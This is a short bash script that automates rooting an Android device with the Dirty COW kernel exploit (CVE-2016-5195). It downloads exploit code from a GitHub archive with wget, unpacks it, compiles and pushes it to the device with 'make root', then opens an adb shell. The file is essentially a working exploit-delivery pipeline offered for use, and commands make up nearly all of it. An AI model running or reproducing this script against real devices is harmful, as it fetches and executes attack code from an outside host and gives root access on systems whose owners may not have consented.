#!/bin/bash

# Give the usual warning.
clear;
echo "[INFO] Automated Android root script started.\n\n[WARN] Exploit requires sdk module \"NDK\".\nFor more information, visit the installation guide @ https://goo.gl/E2nmLF\n[INFO] Press Ctrl+C to stop the script if you need to install the NDK module. Waiting 10 seconds...";
sleep 10;
clear;

# Download and extract exploit files.
echo "[INFO] Downloading exploit files from GitHub...";
workspacezip="dirtyc0w_workspace.zip";
workspace="dirtyc0w_workspace";
rm -f $workspacezip > /dev/null; # Remove zip if it exists
rm -rf $workspace > /dev/null; # Remove workspace if it exists
wget -O dirtyc0w_workspace.zip https://github.com/Arinerron/CVE-2016-5195/archive/master.zip > /dev/null 2>&1;
if [ -f $workspacezip ];
then
    echo "[INFO] Extracting exploit files...";
    unzip -a $workspacezip -d $workspace > /dev/null;
    rm -f $workspacezip; # Remove zip if it exists
else
   echo "[ERR] Failed to download exploit files.";
   exit 1;
fi;
if [ -d $workspace ];
then
    cd $workspace;
    directory=$PWD; # thx @tomdeboer!
    cd CVE-2016-5195-master;
else
    echo "[ERR] Failed to extract exploit files.";
    exit 1;
fi;

# Compile and send exploit.
echo "[INFO] Exploiting dirtyc0w vulnerability...";
sleep 1; # Let them read the message before chaos
make root;
clear;

# Hooray!
echo -n "[INFO] Complete. Installed package \"run-as\" on device.\n[INFO] Cleaning up workspace...";
rm -rf $directory; # Clean up workspace
echo "Done";
echo "[INFO] Starting shell in 3 seconds...";
sleep 3; # Look, it worked!
adb shell;
clear;
exit 0;
